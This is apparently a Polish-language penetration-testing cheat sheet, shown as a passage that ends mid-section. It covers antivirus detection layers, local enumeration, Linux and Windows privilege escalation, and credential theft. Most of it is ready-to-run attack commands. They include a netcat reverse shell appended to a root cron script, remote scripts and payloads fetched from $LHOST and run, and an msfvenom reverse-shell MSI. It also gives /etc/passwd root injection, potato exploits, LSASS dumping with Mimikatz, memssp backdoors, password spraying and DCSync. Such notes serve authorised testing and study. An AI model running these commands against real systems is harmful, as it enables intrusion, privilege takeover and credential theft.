| **Statyczna heurystyka** | przed uruchomieniem | podejrzane ciągi, importy API, entropia (spakowane/zaszyfrowane) |
| **AMSI** | uruchomienie skryptu | treść skryptu **po** deobfuskacji — dlatego samo base64/`-enc` nie wystarcza |
| **Behawioralna / EDR** | w trakcie działania | wzorce: alokacja RWX, injection do obcego procesu, `powershell` odpalony przez `winword.exe` |
| **Machine Learning / cloud** | plik nieznany | metadane próbki wysłane do chmury (Defender: klient→cloud ML) — łapie *nieznane* warianty; wymaga internetu (często brak na wewn. serwerach) |

**Silniki AV (co konkretnie skanuje — model OffSec §15.1):** *File engine* (skan on-disk: zaplanowany + real-time przez **mini-filter driver** w kernelu — dlatego łapie zapis pliku) · *Memory engine* (podejrzane API/sygnatury w pamięci procesu → injection) · *Network engine* (ruch C2) · *Disassembler* + *Emulator/Sandbox* (rozpakowuje packer/crypter i odpala próbkę w izolacji) · *Browser plugin* · *ML engine*. AV działa **i w kernelu, i w user-landzie** — stąd trudno „ominąć wszystko naraz".

**Dlaczego cradle z §2.14 potrafi paść (mapowanie na warstwy):**
- surowy `IEX(New-Object Net.WebClient).DownloadString(...)` → łapie **AMSI** (widzi rozpakowany string) + heurystyka.
- payload zapisany plikiem na dysk → **sygnatura** jeszcze przed wykonaniem.
- reverse shell wstrzykiwany do procesu → **EDR** na behawiorze (to właśnie te `VirtualAlloc`/`CreateRemoteThread`, które łapiemy detekcyjnie w §11.6).

> 💎 **Dwie obserwacje z §15 OffSec (praktyczne):** 1) **hash-only to słaba sygnatura** — zmiana JEDNEGO bitu w pliku daje zupełnie inny SHA256, więc detekcja po samym hashu jest krucha (stąd AV używa też wzorców binarnych/stringów, nie tylko hasha; do własnych reguł: **YARA**, do sprawdzenia próbki: **VirusTotal** — ale upload = oddajesz próbkę do publicznej bazy). 2) **świeży payload > nieaktualna sygnatura** — po nowej wersji Metasploita/narzędzia jest okno, zanim vendor dopisze i wypchnie sygnaturę; zaktualizowany atakujący bywa chwilowo niewykrywany. To argument do raportu: „poleganie wyłącznie na sygnaturach zostawia okno detekcyjne".

**Kategorie technik evasion — nazewnictwo do raportu i CVE-checku (świadomie bez implementacji):**
- *On-disk*: obfuskacja/enkodowanie źródła, packing/crypting, podmiana template'u — vs sygnatura/heurystyka.
- *In-memory*: wykonanie bez zapisu na dysk (fileless) — omija skan on-write.
- *AMSI*: techniki celujące w płaszczyznę skanowania skryptów — dlatego blue-team monitoruje integralność AMSI (§11.6).
- *EDR unhooking / behavior*: omijanie hooków user-mode — vs telemetria kernel/ETW.

> ℹ️ **Rozpoznanie środowiska (legalne, nieofensywne):** `Get-MpComputerStatus` (Defender wł.?), `Get-MpPreference | Select Exclusion*` (ścieżki wykluczone ze skanu — częsty misconfig do zaraportowania), `sc query windefend`, lista usług EDR w procesach. To enumeracja, nie obejście.

---

# 3. Post-Exploitation — Situational Awareness

> Cel fazy: „gdzie jestem, kim jestem, co widzę”. Automatyzuj (linpeas/winpeas), ale rozumiej ręczne komendy.

## 3.1 Linux — rozpoznanie lokalne

### Automat (najpierw to)
```bash
# Serwuj z Kali: python3 -m http.server 8000 ; potem na ofierze:
curl http://$LHOST:8000/linpeas.sh | sh
# alternatywy: pspy (podgląd procesów/cronów bez roota), LinEnum.sh
```

### System
```bash
cat /etc/issue; cat /etc/*-release; uname -a        # dystrybucja + wersja kernela
ls -lah /home/*                                      # kto ma home i jakie permisje
```
### Procesy
```bash
ps aux                                               # a,x = wszystkie; u = czytelnie
watch -n 1 "ps -aux | grep pass"                     # łap procesy zawierające 'pass'
```
### Sieć
```bash
route; routel                                         # tablice routingu
ss -anp                                               # połączenia: -a wszystkie, -n bez DNS, -p proces
sudo tcpdump -i lo -A | grep "pass"                   # podsłuch loopbacka, filtr 'pass'
```
### Firewall / Cron / Aplikacje
```bash
cat /etc/iptables/*                                   # reguły (Debian iptables-persistent)
ls -lah /etc/cron*                                    # zadania cron
cat /etc/crontab                                      # admini często dopisują tu joby jako root!
crontab -l                                            # zadania bieżącego usera
sudo crontab -l                                       # zadania root (jeśli sudo)
grep "CRON" /var/log/syslog                           # historia wykonań cron
dpkg -l                                               # zainstalowane pakiety (Debian)
```
### User trails (ślady poświadczeń)
```bash
env                                                   # zmienne środowiskowe (czasem hasła!)
cat ~/.bashrc                                         # trwałe zmienne (np. SCRIPT_CREDENTIALS)
cat ~/.bash_history                                   # historia poleceń
grep -rniE "password|passwd|secret|api_key" /var/www /home /etc 2>/dev/null
```
### Mounty i dyski
```bash
mount; cat /etc/fstab; lsblk                          # zamontowane / montowane przy boocie / dyski
```
### Kernel modules
```bash
lsmod                                                 # załadowane moduły
/sbin/modinfo libata                                  # szczegóły modułu (wymaga pełnej ścieżki)
```

## 3.2 Windows — rozpoznanie lokalne

### Automat
```powershell
# winPEAS.exe / winPEASany.exe  |  PowerUp.ps1 (Invoke-AllChecks)  |  Seatbelt.exe
.\winPEASx64.exe
```

### Kto i gdzie (użytkownik, host, uprawnienia)
```cmd
whoami                          :: domena\użytkownik
whoami /groups                  :: grupy (klucz do szukania uprawnień admina)
whoami /priv                    :: uprawnienia (SeImpersonate, SeBackup itd. → privesc!)
whoami /all                     :: wszystko naraz
hostname
net user <username>             :: szczegóły konkretnego konta
```
### Konta i grupy
```cmd
net user                        :: lokalni użytkownicy   (PS: Get-LocalUser)
net localgroup                  :: lokalne grupy         (PS: Get-LocalGroup)
net localgroup Administrators   :: kto ma admina         (PS: Get-LocalGroupMember Administrators)
```
### Uruchamianie jako inny user
```powershell
runas /user:dave powershell
Start-Process powershell -Verb runAs
```
### System operacyjny
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic os get Caption, OSArchitecture, Version
```
### Sieć
```cmd
ipconfig /all                   :: pełna konfiguracja kart
netstat -ano                    :: połączenia + PID
arp -a                          :: tablica ARP (świetne do pivotingu — kto jest w LAN)
route print                     :: tablica routingu
```
### Oprogramowanie
```cmd
wmic product get name, version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr /i "displayname"
:: PS (szybsze niż wmic):
powershell "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion"
```
### Procesy
```cmd
tasklist /v                     :: /v pokazuje na jakim koncie działa proces
powershell Get-Process
```
### Szukanie plików i historii
```powershell
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.config -File -Recurse -ErrorAction SilentlyContinue
# Historia PowerShell (częsty jackpot z hasłami):
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Szukanie haseł w plikach:
findstr /si password *.txt *.ini *.config *.xml
```

---

# 4. Privilege Escalation (Eskalacja uprawnień)

> Cel fazy: z usera → root/SYSTEM. Najpierw automat (linpeas/winpeas), potem ręczna weryfikacja tropów.
> 🔗 **GTFOBins** (Linux): https://gtfobins.github.io  |  **LOLBAS** (Windows): https://lolbas-project.github.io

> 🎯 **Drogowskaz — Linux:** `sudo -l` (§4.1) → `id`/grupy → SUID (`find / -perm -4000`) → capabilities → cron zapisywalny → kernel (`uname -r`). Każdy trop sprawdź na GTFOBins.
> 🎯 **Drogowskaz — Windows:** `whoami /priv` (§4.2, szukaj SeImpersonate→potato) → usługi (unquoted/słabe ACL) → zapisane creds (`cmdkey /list`, historia PS, unattend/GPP) → AlwaysInstallElevated → auto-logon w rejestrze.
> 💎 **Co wartościowe:** hasła w plikach/historii/configu · reużywalne creds z usług · zapisywalny plik uruchamiany przez root/SYSTEM · token z przywilejem impersonacji.

## 4.1 Linux privesc

### SUID / SGID binaries
> Bit SUID (`s` zamiast `x`) pozwala uruchomić plik z prawami **właściciela**.
```bash
find / -perm -u=s -type f 2>/dev/null                 # znajdź SUID
find / -perm -g=s -type f 2>/dev/null                 # znajdź SGID
```
Jeśli np. `find` ma SUID → wykonaj polecenie jako root:
```bash
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```
> Dla każdego nietypowego SUID-a sprawdź **GTFOBins** → sekcja "SUID".
> 💡 **Namierzenie wzrokowe:** w `ls --color` SUID = **czerwone tło** (bit `s`); potwierdź `ls -l` → `-rwsr-xr-x` (`s` w miejscu `x` właściciela).

**Custom SUID (spoza GTFOBins) → PATH hijack.** Autorska binarka SUID, która woła zewnętrzną komendę **bez pełnej ścieżki**, wykona Twoją podstawioną wersję z prawami właściciela (roota):
```bash
strings ./suidbin | grep -iE 'system|exec|popen|/bin|/usr|cp|chpasswd|service|ps|tar'
#   gola nazwa komendy (bez '/') = PODATNE na PATH hijack
cd /tmp
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > <wolana_komenda>
chmod +x <wolana_komenda>
export PATH=/tmp:$PATH          # Twoje /tmp ma pierwszenstwo w wyszukiwaniu
./suidbin                       # root wykona Twoja <wolana_komenda>
/tmp/rootbash -p                # -p = zachowaj euid=0 -> interaktywny root shell (NIE -c)
id                             # euid=0(root)
```
> Wariant: gdy SUID woła komendę **z pełną ścieżką**, PATH hijack odpada → sprawdź samą komendę w GTFOBins, argumenty wstrzykiwane z Twojego inputu, albo `LD_PRELOAD`/`LD_LIBRARY_PATH` (gdy `sudo` z `env_keep`, bo zwykłe SUID czyści env).

### Sudo
```bash
sudo -l                                                # co user może uruchomić jako root/inny
```
Przykład: `(ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get` → sprawdź każdy w GTFOBins ("Sudo").
> ⚠️ Uważaj na AppArmor — komenda z sudo może być blokowana profilem:
```bash
cat /var/log/syslog | grep tcpdump                     # szukaj apparmor="DENIED"
su - root; aa-status                                   # co AppArmor chroni
```
Sudo bez hasła + `LD_PRELOAD`/`env_keep`, stare CVE (Baron Samedit `sudo -V`), itp. — patrz GTFOBins.

### Capabilities
> Uprawnienia nadawane binarkom bez pełnego SUID. `cap_setuid+ep` = można zostać rootem.
```bash
/usr/sbin/getcap -r / 2>/dev/null
```
```
/usr/bin/perl = cap_setuid+ep          <- jackpot
```
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

### Cron jobs z błędnymi uprawnieniami
```bash
grep "CRON" /var/log/syslog
ls -lah /etc/cron*
cat /etc/crontab
```
Znajdź katalogi/pliki zapisywalne przez usera:
```bash
find / -writable -type d 2>/dev/null                   # zapisywalne katalogi
find / -writable -type f 2>/dev/null | grep -v /proc    # zapisywalne pliki
```
Zapisywalny skrypt uruchamiany przez root-cron → **dopisz** (nie nadpisuj!) reverse shell:
```bash
ls -lah /home/joe/.scripts/user_backups.sh             # -rwxrwxrw- = każdy pisze
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 1234 >/tmp/f" >> user_backups.sh
nc -lnvp 1234                                           # czekaj do minuty na strzał crona → potwierdź id (uid=0)
```
> Dopisuj przez `>>`, żeby legalny backup dalej działał. Cleanup: usuń dopisaną linię i `/tmp/f`.

### Zapisywalny /etc/passwd (nadpisanie hasła root)
> Jeśli hash jest w 2. kolumnie /etc/passwd, ma pierwszeństwo przed /etc/shadow.
```bash
openssl passwd w00t                                    # wygeneruj hash crypt
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2                                               # hasło: w00t
```

### Zbieranie poświadczeń lokalnie (hidden in plain view)
> Najszybsza droga do roota bywa przez podsłuchane/zapisane hasło (`su` z wyciekiem). Enum systemu → patrz §3.1.
```bash
env; cat ~/.bashrc ~/.bash_history 2>/dev/null         # eksporty typu SCRIPT_CREDENTIALS=...
watch -n 1 "ps -aux | grep pass"                       # łap krótkie procesy z hasłem w linii poleceń (sshpass -p...)
sudo tcpdump -i lo -A | grep "pass"                    # podsłuch creds usług lokalnych (user:root,pass:lab)
su - root                                              # spróbuj wyciekniętego hasła wprost
```
Pivot na inne konto SSH po wzorcu hasła (crunch → hydra):
```bash
crunch 6 6 -t Lab%%% > wordlist                         # 'Lab'+3 cyfry (% = cyfra); buduj z częściowego wywiadu
hydra -l eve -P wordlist $IP -t 4 ssh -V                # -t 4 nisko, by nie zrywać SSH
ssh eve@$IP; sudo -l
```

### Kernel exploit — pełny workflow (ostateczność)
> Gdy sudo/SUID/cap/cron martwe. Ryzyko crasha → tylko w zakresie, najlepiej najpierw na klonie.
```bash
uname -r; cat /etc/issue                                # dokładny kernel + dystrybucja (dobór CVE)
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
cp /usr/share/exploitdb/exploits/linux/local/45010.c . # 45010 = CVE-2017-16995 (Ubuntu 16, kernel <4.13.9)
scp 45010.c joe@$IP:                                    # transfer na cel
gcc 45010.c -o exp; file exp                            # kompiluj NA celu (unika niezgodności libów); file = sprawdź arch
./exp; id                                               # → uid=0
```
> `head` na `.c` czyta instrukcje kompilacji autora. Dopasuj kernel **oraz** dystrybucję. Automat-backstop: `unix-privesc-check standard > out.txt` (Kali-native, przenieś na cel).

### Inne szybkie tropy
```bash
sudo -l                                                # zawsze najpierw
find / -perm -u=s -type f 2>/dev/null                  # SUID
getcap -r / 2>/dev/null                                # capabilities
# Grupy poboczne (id): docker/lxd → GTFOBins container-escape; DirtyPipe/PwnKit/CVE-2021-4034 wg kernela
```

## 4.2 Windows privesc

### Uprzywilejowane tokeny (whoami /priv)
> Jeśli masz któreś z tych → droga do SYSTEM:
| Privilege | Wykorzystanie |
|-----------|---------------|
| **SeImpersonatePrivilege** | Ataki „potato” (PrintSpoofer/GodPotato/JuicyPotato) — impersonacja SYSTEM |
| **SeAssignPrimaryTokenPrivilege** | j.w., w parze z SeImpersonate |
| **SeBackupPrivilege** | Czytanie dowolnego pliku → dump SAM/SYSTEM hive |
| **SeRestorePrivilege** | Zapis dowolnego pliku/klucza rejestru |
| **SeDebugPrivilege** | Podpięcie debuggera → dump LSASS, injection |
```
whoami /all
systeminfo
set
```
**Potato (SeImpersonate) — najczęstszy przypadek z konta serwisowego:**
```cmd
PrintSpoofer64.exe -i -c cmd                            :: Win10/Server 2016-2019
GodPotato -cmd "cmd /c whoami"                          :: nowsze systemy
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
.\SigmaPotato "net localgroup Administrators dave4 /add"   :: nowszy fork (in-memory, .NET)
```

### Service hijacking (słabe uprawnienia usług)
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}
# Sprawdź uprawnienia binarki usługi (czy możesz nadpisać):  icacls "C:\Path\service.exe"
# Automat (PowerUp): znajdź i nadpisz podatną usługę jednym ruchem:
#   Import-Module .\PowerUp.ps1 ; Invoke-AllChecks
#   Install-ServiceBinary -Name 'vulnsvc'      # podmienia binarkę → dodaje admina
```

### Unquoted Service Paths
> Ścieżka usługi bez cudzysłowów + spacja → Windows próbuje uruchomić `C:\Program.exe` itd.
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### DLL Hijacking
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, InstallLocation
```
> Użyj **Process Monitor** (filtr: Result = NAME NOT FOUND, Path kończy się na .dll) żeby znaleźć DLL ładowany z zapisywalnej ścieżki.

### Registry — auto-logon i sekrety
```cmd
:: Auto-logon credentials (sprawdź DefaultPassword + AutoAdminLogon=1)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
:: Zainstalowane apps
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
:: Szukanie 'password' w całym rejestrze
reg query HKLM /f "password" /t REG_SZ /s
```

### Scheduled Tasks — podmiana zapisywalnej akcji (privesc)
```cmd
schtasks /query /fo LIST /v                             :: szukaj: Task To Run, Run As User, Next Run Time
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe  :: masz (F) Full? → podmień binarkę akcji
```
```powershell
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak    # backup oryginału
iwr -Uri http://$LHOST/adduser.exe -Outfile BackendCacheCleanup.exe    # podłóż payload
move .\BackendCacheCleanup.exe .\Pictures\
net localgroup administrators                           # po odpaleniu tasku sprawdź efekt
```
> 3 pytania: (1) jaki user uruchamia task (elewacja tylko gdy uprzywilejowany), (2) czy trigger jeszcze strzeli, (3) co robi akcja. Poczekaj jeden interwał. Cleanup: przywróć `.bak`.
```cmd
:: Tworzenie zdalne (wymaga uprawnień):
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<payload>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "THMtask1"
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```
> **Payload `adduser` do hijacków** (service / DLL / scheduled task) — kompilacja na Kali (mingw):
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe        # rdzeń: system("net user dave2 Pass123! /add"); system("net localgroup administrators dave2 /add");
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll   # wariant DLL (te same 2× system() w DllMain / DLL_PROCESS_ATTACH)
```

### Kernel exploit / brakujący patch (ostateczność)
> Gdy wektory usług/tokenów/creds martwe, a patch-level niski.
```powershell
Get-CimInstance -Class win32_quickfixengineering | ? { $_.Description -eq "Security Update" }   # sparse lista = kandydat
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
```cmd
:: zmapuj OS build + zainstalowane KB w MSRC Update Guide → znajdź BRAKUJĄCY patch (np. CVE-2023-29360 → KB5027215)
.\CVE-2023-29360.exe & whoami                            :: → nt authority\system
```
> Uruchamiaj TYLKO ze zweryfikowanym źródłem, najlepiej najpierw na klonie — kernel exploit potrafi zawiesić maszynę. Disruptive = sprawdź rules of engagement.

### Zapisane poświadczenia (hidden in plain view)
```cmd
cmdkey /list                                            :: zapisane creds Windows
runas /savecred /user:admin "cmd /c whoami"             :: użyj zapisanych creds BEZ znajomości hasła
:: Pliki z hasłami (unattend/sysprep/GPP Groups.xml):
dir /s /b C:\*unattend.xml C:\*sysprep.xml C:\*Groups.xml 2>nul
findstr /si password *.xml *.ini *.txt *.config 2>nul
```
```powershell
type C:\Users\Public\Transcripts\*                        # transkrypty PowerShell (jackpot z hasłami)
(Get-PSReadlineOption).HistorySavePath ; Get-History       # historia PS bieżącej sesji
Get-ChildItem C:\ -Include *.kdbx,*.config,*.txt -File -Recurse -ErrorAction SilentlyContinue
```

### AlwaysInstallElevated (dowolny MSI jako SYSTEM)
```cmd
:: Jeśli OBA klucze zwrócą 0x1 → każdy MSI instaluje się jako SYSTEM:
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o evil.msi
# na celu:  msiexec /quiet /qn /i evil.msi
```

---

# 5. Credential Access (Pozyskiwanie poświadczeń)

## 5.1 Łamanie hashy

### John the Ripper
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt                                  # pokaż złamane
# Automatyczne rozpoznanie typu: john potrafi zgadnąć, ale przy AD zwykle podajesz format ręcznie
```
### Hashcat (szybszy, GPU)
```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt    # -m = typ hasha
```
| `-m` | Typ |
|------|-----|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | sha512crypt (/etc/shadow) |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 (Responder) |
| 13100 | Kerberoast (TGS-REP) |
| 18200 | AS-REP Roast |
```bash
hashcat --example-hashes | grep -iA2 "ntlm"             # gdy nie znasz numeru -m
```
> Identyfikacja typu hasha przed łamaniem: `hashid '<hash>'` lub `nth --text '<hash>'`.

### Ekstrakcja hasha z pliku (`*2john`)
```bash
ssh2john id_rsa | sed 's/^[^:]*://' > ssh.hash    # ZDEJMIJ prefiks 'id_rsa:' — inaczej hashcat nie ładuje/łamie śmieci!
keepass2john Database.kdbx | sed 's/^[^:]*://' > kp.hash   # to samo: usuwa prefiks 'Database:'
zip2john plik.zip > zip.hash           # (analogicznie: office2john, gpg2john, pdf2john)
hashcat -m 13400 kp.hash  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule   # KeePass
# Znajdź bazy KeePass na Windows (bywa kilka — personal + dział):
#   Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
> ⚠️ **Cichy killer:** `*2john` dokleja `nazwapliku:` (jako „username") na początku — obejrzyj hash gołym okiem, wytnij wszystko do pierwszego `:`. **Klucz SSH:** `-m 22921` działa TYLKO dla `$6$`/SHA-512; nowoczesny **aes-256-ctr → "Token length exception"** → fallback do Johna:
```bash
ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash && john --show ssh.hash    # John ogarnia aes-256-ctr; chmod 600 id_rsa przed użyciem klucza
```
> Dodatkowe tryby `-m`: **13400** KeePass · **22921** klucz SSH · **11600** 7-Zip · **13600** ZIP · **9600** Office 2013+ · **7500** Kerberos AS-REQ (etype 23).

**Reguły hashcat pod znaną politykę** (z `note.txt` znasz wzorzec → zbuduj regułę ręcznie — często jedyna droga):
```bash
echo '$1' > demo.rule                              # składnia: $X dopisz na końcu · ^X na początku · c Kapitalizuj · l/u lower/upper · r odwróć
hashcat -r demo.rule --stdout wordlist.txt         # DEBUG: pokaż kandydatów bez łamania (weryfikacja reguły)
hashcat -m 0 hash.txt rockyou.txt -r demo.rule --force
```
> Wiele funkcji w jednej linii = łączone: `$1 c $!` → `Password1!`. Każda linia = osobna mutacja. Ludzki nawyk: Kapitał na początku, cyfry, special na końcu (`! @ #`). Escape w shellu: `echo \$1`.

### Password spraying (1 hasło × wielu userów)
> **Najpierw sprawdź politykę lockout**, policz bezpieczną liczbę prób:
```cmd
net accounts                          :: Lockout threshold / observation window / min. długość hasła (na hoście domenowym)
```
Z Kali / Linuxa:
```bash
crackmapexec smb $DC -u users.txt -p 'Sezon2024!' -d $DOMAIN --continue-on-success   # nxc = następca cme; '(Pwn3d!)' = local admin!
kerbrute passwordspray -d $DOMAIN users.txt 'Sezon2024!'          # przez Kerberos (2 pakiety UDP/próbę, najciszej)
# ⚠️ Błąd sieciowy w kerbrute? users.txt musi być w kodowaniu ANSI (Notepad → Save As → Encoding: ANSI)
```
Z hosta domenowego (Windows):
```powershell
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin        # auto-enumeruje userów i sprayuje (-File = wordlista, -Admin = też admini)
# Low-and-slow przez ADSI (najmniej ruchu — 1 obiekt = 1 próba):
$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $PDC=($d.PdcRoleOwner).Name
$DN="DC=$($d.Name.Replace('.',',DC='))"; $S="LDAP://$PDC/$DN"
New-Object System.DirectoryServices.DirectoryEntry($S,"pete","Nexus123!")   # brak wyjątku = hasło poprawne
```
> ⚠️ **Lockout:** spray JEDNYM hasłem na rundę, z przerwami. `crackmapexec` NIE sprawdza polityki i jest głośny (pełne SMB/próba); `kerbrute` najcichszy. `Spray-Passwords.ps1` wymaga `powershell -ep bypass`. Mutacje list: `hashcat --stdout wordlist.txt -r best64.rule` albo `kwp`.

## 5.2 Mimikatz (Windows, wymaga admina/SYSTEM)

### Dump NTLM z lokalnego SAM
```
mimikatz
privilege::debug
token::elevate
lsadump::sam
```
### Dump NTLM z pamięci LSASS
```
privilege::debug
token::elevate
sekurlsa::msv
sekurlsa::logonpasswords            :: sprawdź blok 'wdigest:' — Password inny niż (null) = PLAINTEXT za darmo (Win7/2008R2/WDigest on)
```
> Wymuszenie WDigest (potem czekaj na logowanie/RDP): `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1`.

### Offline LSASS — zrzuć teraz, wyciągnij później (mniej podejrzane niż mimikatz live)
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp     :: albo Task Manager → lsass.exe → Create dump file
```
```bash
pypykatz lsa minidump lsass.dmp                       # parsowanie na Kali (bez mimikatza)
```
```
:: albo w mimikatz (na maszynie pomocniczej): sekurlsa::minidump ŁADUJ PRZED logonpasswords!
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
> ⚠️ Bitowość dumpu i parsera musi się zgadzać. Analogia offline dla NTDS.dit → §5.6.

### Kradzież certyfikatów (klucze non-exportable — AD CS / smart-card)
```
crypto::capi                        :: patch CryptoAPI (klucze user-store)
crypto::cng                         :: patch KeyIso/CNG (klucze machine-store)
crypto::certificates /systemstore:local_machine /store:my /export   :: eksport cert+klucz do .pfx (hasło: mimikatz)
```
> `capi`/`cng` PRZED `certificates /export` — patch pozwala wyeksportować inaczej „non-exportable" klucz. Skradziony cert client-auth → logowanie PKINIT jako ofiara (persistencja).

### Klucze Kerberos (do Pass-the-Key)
```
privilege::debug
sekurlsa::ekeys
```
### DCSync (wyciągnij hash dowolnego usera z DC — wymaga uprawnień replikacji)
```
lsadump::dcsync /domain:za.tryhackme.com /user:Administrator
```
### memssp (SSP backdoor — plaintext przy logowaniu; obejście Credential Guard)
```
privilege::debug
misc::memssp
```
```powershell
Get-ComputerInfo | Select DeviceGuardSecurityServicesRunning   # zawiera 'CredentialGuard' = LSASS chroniony
type C:\Windows\System32\mimilsa.log                            # plaintext creds po memssp + NASTĘPNYM logowaniu
```
> **Credential Guard** blokuje zrzut LSASS (`sekurlsa` pokazuje tylko „LSA Isolated Data") — ale chroni TYLKO konta **domenowe**; lokalne z SAM (`lsadump::sam`) zrzucasz normalnie. `memssp` wstrzykuje SSP (bez DLL na dysku) i łapie plaintext przy **kolejnym** logowaniu (poczekaj / wymuś RDP). OPSEC: `mimilsa.log` to plaintext na dysku — posprzątaj.

### secretsdump (Linux/impacket — alternatywa bez wchodzenia na hosta)
```bash
impacket-secretsdump $DOMAIN/user:password@$IP           # zdalny dump SAM+LSA+NTDS
impacket-secretsdump -just-dc $DOMAIN/user:password@$DC   # DCSync przez sieć (całe NTDS.dit)
```

## 5.3 Kerberos

> 🧠 **Jak to działa (żeby wiedzieć, co atakujesz):** KDC siedzi na DC. Logowanie: **AS-REQ** (klient szyfruje timestamp swoim hashem) → **AS-REP** zwraca **TGT** (zaszyfrowany hashem konta **krbtgt** — klient go nie odczyta) + klucz sesji. Po dostęp do usługi: **TGS-REQ** (przedstaw TGT) → **TGS-REP** zwraca **bilet usługi** (zaszyfrowany hashem **konta usługi/SPN**). Stąd: **krbtgt hash → Golden Ticket** (fałszujesz dowolny TGT), **hash konta usługi → Silver Ticket** (fałszujesz bilet do tej usługi). TGT żyje ~10h. To dlatego AS-REP i Kerberoast dają hashe do łamania offline.

### AS-REP Roasting (Linux — patrz też §1.8)
> Cel: konta z flagą `DONT_REQUIRE_PREAUTH` (UAC `0x410200`). Bez creds można samą listą userów; z creds `-request` bierze hash. Na Windows wylistuj podatnych: `Get-DomainUser -PreauthNotRequired` (PowerView).
```bash
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
impacket-GetNPUsers -dc-ip $DC -request -outputfile asrep.txt $DOMAIN/pete    # z poświadczeniami jednego usera
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### Kerberoasting (konta z SPN — wymaga dowolnych poprawnych creds)
```bash
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
> ⚠️ Błąd `KRB_AP_ERR_SKEW (Clock skew too great)` = rozjazd czasu z DC. Nie zmieniaj zegara Kali — użyj `faketime`: `sudo ntpdate $DC` (odczyt) → `faketime -f '+Xh' impacket-GetUserSPNs ...`. Konta maszynowe/gMSA/krbtgt mają losowe 120-znakowe hasła (niełamalne) → celuj w **konta userów** z SPN.

### Rubeus (Windows — na hoście domenowym)
```
Rubeus.exe asreproast /nowrap                    :: /nowrap = hash bez łamania linii (łatwiej skopiować)
Rubeus.exe kerberoast /outfile:hashes.kerberoast
Rubeus.exe kerberoast /tgtdeleg                   :: wymuś RC4 (etype 23) gdy konto ma AES — łatwiejsze łamanie
```
> Hashe kopiujesz na Kali i łamiesz (18200 / 13100). Rubeus/Ghostpack mają sygnatury AV.

### Targeted roasting (gdy masz GenericWrite/GenericAll nad userem — patrz §6.5)
> Nie znasz podatnych kont, ale kontrolujesz cudzy obiekt? Sam go „uczyń podatnym", zbierz hash, cofnij zmianę:
> - **Targeted Kerberoast:** dopisz SPN ofierze (`Set-DomainObject ... -Set @{serviceprincipalname='fake/svc'}`) → `Rubeus kerberoast` → usuń SPN.
> - **Targeted AS-REP:** ustaw ofierze flagę `DONT_REQ_PREAUTH` (przez UAC) → AS-REP roast → cofnij flagę. **Nie resetuj hasła** (zablokuje usera) — modyfikuj UAC.

## 5.4 Responder — LLMNR / NBT-NS / mDNS poisoning

